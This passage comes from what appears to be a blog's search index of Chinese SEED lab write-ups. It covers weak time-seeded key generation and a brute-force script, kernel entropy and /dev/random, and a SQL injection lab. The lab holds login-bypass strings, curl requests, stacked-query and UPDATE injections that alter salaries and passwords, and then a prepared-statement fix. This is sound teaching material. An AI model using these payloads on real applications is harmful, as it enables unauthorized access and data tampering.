128bit 的 Key 和 IV\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ openssl rand -hex \u003cspan class=\"m\"\u003e16\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用OpenSSL对明文进行加密\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://s2.loli.net/2024/12/20/wtZ3X7rSjqy1OJF.png\" alt=\"image-20241220134440418\"  /\u003e\n\u003c/p\u003e\n\u003ch3 id=\"2-aes-128-cfb-模式加密\"\u003e2. AES-128-CFB 模式加密\u003c/h3\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://s2.loli.net/2024/12/20/WmK8RNFC6yJQ4Mf.png\" alt=\"image-20241220140959181\"  /\u003e\n\u003c/p\u003e\n\u003ch3 id=\"3-blowfish-cbc-模式加密\"\u003e3. Blowfish-CBC 模式加密\u003c/h3\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://s2.loli.net/2024/12/20/Yl5E4mJioyr716T.png\" alt=\"image-20241220141410603\"  /\u003e\n\u003c/p\u003e","title":"SEEDlab—密码技术应用实验"},{"content":"Task 1：用错误的方式生成加密密钥 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #define KEYSIZE 16 void main() { int i; char key[KEYSIZE]; printf(\u0026#34;%lld\\n\u0026#34;, (long long) time(NULL)); srand (time(NULL)); //➀ for (i = 0; i\u0026lt; KEYSIZE; i++){ key[i] = rand()%256; printf(\u0026#34;%.2x\u0026#34;, (unsigned char)key[i]); } printf(\u0026#34;\\n\u0026#34;); } 编译并运行上述代码，结果如下：\n第一行输出的是从纪元 1970-01-01 00:00:00 +0000 (UTC) 到现在的秒数，第二行输出的是以当前时间作为随机数种子产生的加密密钥，可以发现，当初始化随机数生成器的随机数种子不一样时，产生的加密密钥也不同。\n但是如果我们一秒内执行了两次该程序，它们就会使用相同的随机数种子生成随机数，生成的随机数是相同的。\n注释掉第 ① 行，再次运行程序，结果如下：\n可以发现，每次运行程序，即使时间戳不同，生成的随机数都是相同的，这是因为我们注释掉了 srand(time(NULL));，rand() 函数会默认将 1 设置为随机数种子，所以导致每次运行生成的加密密钥都是相同的。\ntime(NULL)：用于获取当前时间 srand()：用于设置 rand() 函数的种子。 Task 2：猜测密钥 计算时间种子：计算从2018年4月17日晚上九点到4月18日零点的时间种子作为遍历的范围。 根据这些时间种子生成加密密钥并写入文件 key.txt。 // guess_key.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;string.h\u0026gt; #define KEYSIZE 16 int main() { time_t start_time = 1524013200; // 2018年4月17日21点的时间戳 time_t end_time = 1524024000; // 2018年4月18日0点的时间戳 unsigned char key[KEYSIZE]; // 密钥数组 FILE *file = fopen(\u0026#34;keys.txt\u0026#34;, \u0026#34;w\u0026#34;); // 打开文件进行写操作 // 遍历每一秒 for (time_t seed = start_time; seed \u0026lt;= end_time; seed++) { srand((unsigned int)seed); // 设置随机数种子 // 使用当前种子生成密钥 for (int i = 0; i \u0026lt; KEYSIZE; i++) { key[i] = rand() % 256; // 生成0-255范围内的随机字节 } // 将密钥写入文件，按16进制格式输出 for (int i = 0; i \u0026lt; KEYSIZE; i++) { fprintf(file, \u0026#34;%.2x\u0026#34;, key[i]); } fprintf(file, \u0026#34;\\n\u0026#34;); // 每个密钥后换行 } fclose(file); // 关闭文件 printf(\u0026#34;密钥已写入文件 keys.txt\\n\u0026#34;); return 0; } 遍历这些密钥，对密文进行解密，并与明文进行比较，找到正确的密钥： # guess_key.py from Crypto.Cipher import AES from binascii import unhexlify, hexlify plain_text = unhexlify(\u0026#34;255044462d312e350a25d0d4c5d80a34\u0026#34;) cipher_text = unhexlify(\u0026#34;d06bf9d0dab8e8ef880660d2af65aa82\u0026#34;) iv = unhexlify(\u0026#34;09080706050403020100A2B2C2D2E2F2\u0026#34;) def decrypt_aes(key, ciphertext, iv): # 创建 AES 解密对象 cipher = AES.new(key, AES.MODE_CBC, iv) # 解密数据 decrypted = cipher.decrypt(ciphertext) return decrypted def main(): # 读取密钥文件 with open(\u0026#34;keys.txt\u0026#34;, \u0026#34;r\u0026#34;) as file: keys = file.readlines() # 遍历每一行密钥，尝试解密 for key_line in keys: key = unhexlify(key_line.strip()) # 将密钥从16进制转换为字节 decrypted_text = decrypt_aes(key, cipher_text, iv) if decrypted_text == plain_text: print(f\u0026#34;正确的密钥是: {key_line.strip()}\u0026#34;) print(f\u0026#34;解密后的结果是: {hexlify(decrypted_text).decode()}\u0026#34;) print(f\u0026#34;明文是: {hexlify(plain_text).decode()}\u0026#34;) break else: print(\u0026#34;没有找到匹配的密钥\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() Task 3：测量内核的熵 使用下面的命令可以打印出当前内核的熵：\n$ cat /proc/sys/kernel/random/entropy_avail 使用 watch 命令来监控内核熵的变化情况：\n$ watch -n .1 cat /proc/sys/kernel/random/entropy_avail 移动鼠标时：发现会使熵值显著地增大。 点击鼠标时：发现会使熵值显著地增大。 输入时：发现会使熵值显著地增大。 读取一个大文件时：发现会使熵值显著地增大。 访问一个网站时：发现会使熵值显著地增大。 以上这些操作都会使内核熵显著增大。\nTask 4：从 /dev/random 中获取随机数 使用 cat 命令持续从 /dev/random 读取伪随机数，并使用管道符传递到 hexdump 进行输出。并使用 watch 命令监视内核熵的变化情况。\n当不移动鼠标也不键入任何内容时，发现不会有新的伪随机数生成，只有当移动鼠标时，才会有新的伪随机数生成。\nQ：假设一个服务器使用 /dev/random 与客户端生成随机会话密钥。请描述你将如何对这样的一个服务器发起拒绝服务（DoS）攻击。\nA：由于 /dev/random 是一个基于熵池的伪随机生成器，并且具有阻塞特性，当熵池中的数据不足时，它会阻塞伪随机的生成，直到熵池变得足够大，利用这个机制，我们可以向服务器发起大量请求，每次请求都会使服务器调用 /dev/random 生成会话密钥，从而消耗熵池中的数据，当熵池中没有足够的熵源时，/dev/random 就会进入阻塞状态，进而拒绝服务，成功对服务器进行了拒绝服务攻击。\nTask 5: 从 /dev/urandom 获取伪随机数 观察 /dev/urandom 生成的伪随机数 使用 cat 命令持续从 /dev/urandom 读取伪随机数，并使用管道符传递到 hexdump 进行输出。并使用 watch 命令监视内核熵的变化情况。\n/dev/urandom 会源源不断地输出伪随机数，即使不移动鼠标也会生成，移动鼠标时，也会一直生成，并且内核熵在一直增加。\n测量 /dev/urandom 生成的伪随机数的质量 首先我们从 /dev/urandom 文件中采集 1MB 的伪随机数，然后使用 ent 工具进行测量。\n熵值为 7.999828 接近 8，完美的随机数的熵值为 8 。 理想压缩率为 0，说明数据非常接近完全随机。 卡方分布检验，概率为 58.89%，接近 50%。 算数平均值接近 127.5。 蒙特卡洛方法估计 $\\pi$ 的值为 3.137180852，接近3.14 相关系数为0.000150，相关性很小，说明很接近完美随机数。 以上说明 /dev/urandom 生成的随机数质量良好。\n使用 /dev/urandom 生成一个 256 bit 的加密密钥 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #define LEN 32 // 256 bits int main() { // 分配内存来存储 256 位（32 字节）随机密钥 unsigned char *key = (unsigned char *) malloc(sizeof(unsigned char) * LEN); // 打开 /dev/urandom 文件获取随机数 FILE* random = fopen(\u0026#34;/dev/urandom\u0026#34;, \u0026#34;r\u0026#34;); // 读取 32 字节（256 位）随机数 size_t bytes_read = fread(key, sizeof(unsigned char), LEN, random); // 输出 256 位（32 字节）密钥 printf(\u0026#34;Generated 256-bit key:\\n\u0026#34;); for (size_t i = 0; i \u0026lt; LEN; i++) { printf(\u0026#34;%02x\u0026#34;, key[i]); // 输出每个字节的 2 位十六进制数 } printf(\u0026#34;\\n\u0026#34;); // 关闭文件并释放内存 fclose(random); free(key); return 0; } ","permalink":"https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C-6-%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%AE%9E%E9%AA%8C-090056/","summary":"\u003ch2 id=\"task-1用错误的方式生成加密密钥\"\u003eTask 1：用错误的方式生成加密密钥\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-c\" data-lang=\"c\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;stdio.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;stdlib.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;time.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#define KEYSIZE 16\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \t\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"n\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eKEYSIZE\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;%lld\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003elong\u003c/span\u003e \u003cspan class=\"kt\"\u003elong\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nf\"\u003etime\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003esrand\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nf\"\u003etime\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e \u003cspan class=\"c1\"\u003e//➀\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"n\"\u003eKEYSIZE\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003erand\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"o\"\u003e%\u003c/span\u003e\u003cspan class=\"mi\"\u003e256\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;%.2x\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003eunsigned\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e编译并运行上述代码，结果如下：\u003c/p\u003e\n\u003cimg src=\"https://s2.loli.net/2024/12/04/sP6Vd4wF257jxbH.png\" alt=\"image-20241204085252794\" style=\"zoom: 67%;\" /\u003e\r\n\u003cp\u003e第一行输出的是从纪元 1970-01-01 00:00:00 +0000 (UTC) 到现在的秒数，第二行输出的是以当前时间作为随机数种子产生的加密密钥，可以发现，当初始化随机数生成器的随机数种子不一样时，产生的加密密钥也不同。\u003c/p\u003e","title":"SEEDlab—伪随机数生成实验"},{"content":"环境设置 修改映射 将以下条目添加到 etc/hosts 目录下，其中 www.seed-server.com 是Web程序的域名，10.9.0.5 是容器的IP\n10.9.0.5\twww.seed-server.com 构建并启动docker 在Labsetup下使用命令 docker-compose build 构建docker 使用命令 docker-compose up 拉起容器，容器中的 /var/lib/mysql 挂载在 Labsetup 目录下。 Task 1：熟悉 SQL 语句 进入容器shell并使用mysql客户端与数据库进行交互 docker ps docksh a3 mysql -u root -pdees 加载数据库并打印数据库中的所有表 使用命令show databases;查看所有数据库： mysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sqllab_users | | sys | +--------------------+ 5 rows in set (0.00 sec) 使用命令use sqllab_users;加载数据库： mysql\u0026gt; use sqllab_users; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; show tables; +------------------------+ | Tables_in_sqllab_users | +------------------------+ | credential | +------------------------+ 1 row in set (0.00 sec) 使用命令show tables;打印此数据库的所有表： mysql\u0026gt; show tables;\r+------------------------+\r| Tables_in_sqllab_users |\r+------------------------+\r| credential |\r+------------------------+\r1 row in set (0.00 sec) 使用命令打印员工 Alice 的所有资料信息 使用命令SELECT * from credential;打印整个表单： ​\t发现Alice在Name表项下，ID为1。\n使用命令SELECT * from credential WHERE Name='Alice'即可打印员工Alice的所有资料： Task 2：基于 SELECT 语句的 SQL 注入攻击 登录界面 使用浏览器访问 www.seed-server.com 进入登录界面，如下：\n使用命令sudo docker cp ec:/var/www/SQL_Injection/unsafe_home.php .可以将登录界面前端代码从docker中拷贝到外部\n登录界面逻辑 $input_uname = $_GET[\u0026#39;username\u0026#39;]; $input_pwd = $_GET[\u0026#39;Password\u0026#39;]; $hashed_pwd = sha1($input_pwd); $input_uname：用户输入的用户名\n$input_pwd：用户输入的密码\n$hashed_pwd: 密码的哈希值\n// create a connection $conn = getDB(); // Sql query to authenticate the user $sql = \u0026#34;SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,nickname,Password FROM credential WHERE name= \u0026#39;$input_uname\u0026#39; and Password=\u0026#39;$hashed_pwd\u0026#39;\u0026#34;; if (!$result = $conn-\u0026gt;query($sql)) { echo \u0026#34;\u0026lt;/div\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/nav\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;div class=\u0026#39;container text-center\u0026#39;\u0026gt;\u0026#34;; die(\u0026#39;There was an error running the query [\u0026#39; . $conn-\u0026gt;error . \u0026#39;]\\n\u0026#39;); echo \u0026#34;\u0026lt;/div\u0026gt;\u0026#34;; } 这段代码使用了sql语句查询表中是否有用户名为$input_uname且密码哈希值为$hashed_pwd的表项，如果有则登录成功。\nTask 2.1：基于网页的 SQL 注入攻击 你的任务是以管理员的身份从登录页面登录到 Web 应用程序，这样 你就可以查看所有员工的信息。管理员的用户名是 admin，口令未知。请在用户名与口令输入框中输入 能成功完成攻击的内容。\n1. 利用 OR 我们可以构造 admin' OR '1=1 作为我们的登录用户名，这样Sql查询语句就变成了:\nSELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,nickname,Password FROM credential WHERE name= \u0026#39;admin\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; and Password=\u0026#39;$hashed_pwd\u0026#39; 在Sql查询中，只要OR的前半部分为真，整个查询就为真，name='admin'为真，于是会直接跳过密码哈希值的判断部分，进而登录成功。\n2. 利用注释 我们可以构造 admin' -- 或admin' #作为用户名,这样后面的语句就会被注释掉：\nWHERE name= \u0026#39;admin\u0026#39; -- and Password=\u0026#39;$hashed_pwd\u0026#39; WHERE name= \u0026#39;admin\u0026#39; #and Password=\u0026#39;$hashed_pwd\u0026#39; 这样也会跳过密码哈希值的判断。\nTask 2.2：基于命令行的 SQL 注入攻击 在不使用网页的情况下完成 Task 2.1 的目标。你可以使用命令行 工具，如 curl，它可以发送 HTTP 请求。如需在 HTTP 请求中包含多个参数，需要把 URL 和参数用一对 单引号括起来。否则，用于分隔参数的特殊字符 (如 \u0026amp;) 会被 shell 曲解，造成命令歧义。\n将 Task 2.1 的命令中的 #，空格，\u0026rsquo;,进行 URL 编码\n# space ' %23 %20 %27 curl \u0026#39;www.seed-server.com/unsafe_home.php?username=admin%27%20OR%20%271=1\u0026amp;Password=\u0026#39; curl \u0026#39;www.seed-server.com/unsafe_home.php?username=admin%27%23\u0026amp;Password=\u0026#39; curl \u0026#39;www.seed-server.com/unsafe_home.php?username=admin%27%20--%20\u0026amp;Password=\u0026#39; 以上三条命令执行后都能登录成功并且回显出表单内容\nTask 2.3：增加一条新的 SQL 语句 admin\u0026#39;; DELETE FROM credential WHERE name=\u0026#39;admin\u0026#39;;# 尝试执行第二条 SQL 语句 DELETE FROM credential WHERE name='admin'; 删除 admin 表项，但是注入失败：\n原因： 查阅 SEED BOOK 后发现和 PHP 中 mysqli 拓展的 query() 函数有关，query()不允许在数据库服务器中运行多条语句，这是为了防止恶意用户通过 SQL 注入攻击执行额外的恶意 SQL 操作。即使攻击者在注入的输入中添加了分号，数据库也不会执行多条sql语句，会直接抛出错误。\nTask 3：基于 UPDATE 语句的 SQL 注入攻击 当员工通过编辑界面编辑他们的信息时，是通过如下的SQL语句更新表单内容的，在 unsafe_edit_backend.php 文件中实现的 PHP 代码用于更新员工的个人信息：\n$conn = getDB(); // Don\u0026#39;t do this, this is not safe against SQL injection attack $sql=\u0026#34;\u0026#34;; if($input_pwd!=\u0026#39;\u0026#39;){ // In case password field is not empty. $hashed_pwd = sha1($input_pwd); //Update the password stored in the session. $_SESSION[\u0026#39;pwd\u0026#39;]=$hashed_pwd; $sql = \u0026#34;UPDATE credential SET nickname=\u0026#39;$input_nickname\u0026#39;,email=\u0026#39;$input_email\u0026#39;,address=\u0026#39;$input_address\u0026#39;,Password=\u0026#39;$hashed_pwd\u0026#39;,PhoneNumber=\u0026#39;$input_phonenumber\u0026#39; where ID=$id;\u0026#34;; }else{ // if passowrd field is empty. $sql = \u0026#34;UPDATE credential SET nickname=\u0026#39;$input_nickname\u0026#39;,email=\u0026#39;$input_email\u0026#39;,address=\u0026#39;$input_address\u0026#39;,PhoneNumber=\u0026#39;$input_phonenumber\u0026#39; where ID=$id;\u0026#34;; } $conn-\u0026gt;query($sql); 可以发现代码是通过执行一个sql语句进行表单的更新：\nUPDATE credential SET nickname=\u0026#39;$input_nickname\u0026#39;,email=\u0026#39;$input_email\u0026#39;,address=\u0026#39;$input_address\u0026#39;,Password=\u0026#39;$hashed_pwd\u0026#39;,PhoneNumber=\u0026#39;$input_phonenumber\u0026#39; where ID=$id; Task 3.1：修改自己的工资 编辑页面中只能修改员工的昵称、电子邮件、地址、电话号码和口令，而不能用于修改工资。假设你 (Alice) 由于老板 Boby 今年未给你加薪而感到不满。你想利用存在于编辑页面的 SQL 注入漏洞来增加自己的工资。请展示你是如何实现这一目标的。已知列 salary 用于存储工资数额。\n由于 PhoneNumber 是修改的最后一项，于是我们可以在 PhoneNumber 这里注入：\n填入 ',salary=99999 WHERE name='Alice' # ，相当于执行了：\nUPDATE credential SET nickname=\u0026#39;\u0026#39;,email=\u0026#39;\u0026#39;,address=\u0026#39;\u0026#39;,Password=\u0026#39;$hashed_pwd\u0026#39;,PhoneNumber=\u0026#39;\u0026#39;,salary=99999 where name=\u0026#39;Alice\u0026#39; #\u0026#39; where ID=$id; ; 这会把 Alice 的 Salary 表项改成 99999：\nTask 3.2：修改他人的工资 在提高自己的工资数额后，你决定惩罚你的老板 Boby，将他的工资减少到 1 美元。请展示你是如何实现这一目标的。\n在 PhoneNumber 项填入 ',salary=1 WHERE name='Boby' #，相当于执行了：\nUPDATE credential SET nickname=\u0026#39;$input_nickname\u0026#39;,email=\u0026#39;$input_email\u0026#39;,address=\u0026#39;$input_address\u0026#39;,Password=\u0026#39;$hashed_pwd\u0026#39;,PhoneNumber=\u0026#39;\u0026#39;,salary=1 WHERE name=\u0026#39;Boby\u0026#39; #\u0026#39; where ID=$id; 这会将 Boby 的工资表项更新成 1\nTask 3.3：修改他人的口令 修改完 Boby 的工资后，你仍心有不甘，所以你想修改 Boby 的口令，这样你就可以登录他的账户，做进一步的破坏。\n由于 Password 在数据库中是以 SHA1 哈希后的哈希值存储的，如果我想把 Boby 的 Password 改为88888888，我就要将数据库中 Boby 对应的 Password 改为 SHA1(88888888)。\n通过 CyberChef 计算出哈希后的值：\n在 PhoneNumber 项填入 ',Password='05b530ad0fb56286fe051d5f8be5b8453f1cd93f' WHERE name='Boby' #，这会修改 Boby 的数据库中的 Password 值：\n现在我们再尝试使用密码 88888888 登录，发现登录成功：\nTask 4：对策：语句预处理 请使用语句预处理机制来修复 SQL 注入漏洞。为了简单起见，我们在文件夹 defense 内创建了一 个简化程序，你需要对这个文件夹中的文件进行修改。\n修改代码 修改 www 容器中的 /var/www/SQL_Injection/defense/ 文件夹下的 unsafe.php 文件，修改后的文件如下所示：\n\u0026lt;?php // Function to create a sql connection. function getDB() { $dbhost=\u0026#34;10.9.0.6\u0026#34;; $dbuser=\u0026#34;seed\u0026#34;; $dbpass=\u0026#34;dees\u0026#34;; $dbname=\u0026#34;sqllab_users\u0026#34;; // Create a DB connection $conn = new mysqli($dbhost, $dbuser, $dbpass, $dbname); if ($conn-\u0026gt;connect_error) { die(\u0026#34;Connection failed: \u0026#34; . $conn-\u0026gt;connect_error . \u0026#34;\\n\u0026#34;); } return $conn; } $input_uname = $_GET[\u0026#39;username\u0026#39;]; $input_pwd = $_GET[\u0026#39;Password\u0026#39;]; $hashed_pwd = sha1($input_pwd); // create a connection $conn = getDB(); // Use prepared statements to prevent SQL injection $stmt = $conn-\u0026gt;prepare(\u0026#34;SELECT id, name, eid, salary, ssn FROM credential WHERE name = ? AND Password = ?\u0026#34;); if ($stmt) { // Bind parameters (s - string, i - int, d - double, b - blob) $stmt-\u0026gt;bind_param(\u0026#34;ss\u0026#34;, $input_uname, $hashed_pwd); // Execute the statement $stmt-\u0026gt;execute(); // Get the result $result = $stmt-\u0026gt;get_result(); if ($result-\u0026gt;num_rows \u0026gt; 0) { // only take the first row $firstrow = $result-\u0026gt;fetch_assoc(); $id = $firstrow[\u0026#34;id\u0026#34;]; $name = $firstrow[\u0026#34;name\u0026#34;]; $eid = $firstrow[\u0026#34;eid\u0026#34;]; $salary = $firstrow[\u0026#34;salary\u0026#34;]; $ssn = $firstrow[\u0026#34;ssn\u0026#34;]; } // Close the statement $stmt-\u0026gt;close(); } // close the sql connection $conn-\u0026gt;close(); ?\u0026gt; 使用准备好的语句（Prepared Statements）：通过 $conn-\u0026gt;prepare() 函数创建查询，并使用 ? 占位符来防止直接插入用户输入内容。 绑定参数：使用 $stmt-\u0026gt;bind_param() 函数，将用户输入的参数绑定到准备好的语句中。这种做法确保了SQL查询不会直接拼接用户输入，从而避免SQL注入风险。其中 \u0026quot;ss\u0026quot; 表示 $input_uname 和 $hashed_pwd 都是字符串类型。 测试 访问 http://www.seed-server.com/defense 再使用 Alice' # 对 USERNAME 进行 SQL 注入测试：\n发现已经无法查询到 Alice 的信息了。\n思考题 为了防止 C 程序在调用外部程序时出现代码注入攻击，我们不应该使用 system()，而应使用 execve()。请描述这种防御措施与防御 SQL 注入攻击的预处理语句之间的相似性。\n1. system() vs execve() 防御代码注入 在 C 语言中使用 system() 调用外部程序时，用户输入直接作为 shell 命令的一部分，如果用户输入中包含特殊字符或命令，就可能导致代码注入攻击。 而 execve() 是更安全的选择，因为它直接调用外部程序，而不使用 shell。这意味着它不会将输入当作 shell 命令进行解析，避免了恶意输入的执行。 2. SQL 预处理语句防御 SQL 注入 在 SQL 查询中，如果直接将用户输入插入到查询字符串中，恶意用户可以利用输入中的特殊字符来构造有害的 SQL 语句，导致 SQL 注入攻击。 使用 SQL 预处理语句可以防止这种情况发生。预处理语句将查询结构与参数分开，参数通过安全绑定方式插入，不会被当作 SQL 代码解析，避免了攻击。 两者的相似性 两者都采用了分离用户输入和实际代码执行的方式，从而防止了恶意代码注入。 execve() 通过直接调用程序避免了 shell 的解析，而预处理语句通过绑定参数避免了 SQL 解析。 在本质上，这些防御措施都是为了避免将用户输入直接传递给解释器或执行环境，从而避免潜在的注入攻击。 ","permalink":"https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3-sql-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/","summary":"\u003ch2 id=\"环境设置\"\u003e环境设置\u003c/h2\u003e\n\u003ch3 id=\"修改映射\"\u003e修改映射\u003c/h3\u003e\n\u003cp\u003e将以下条目添加到 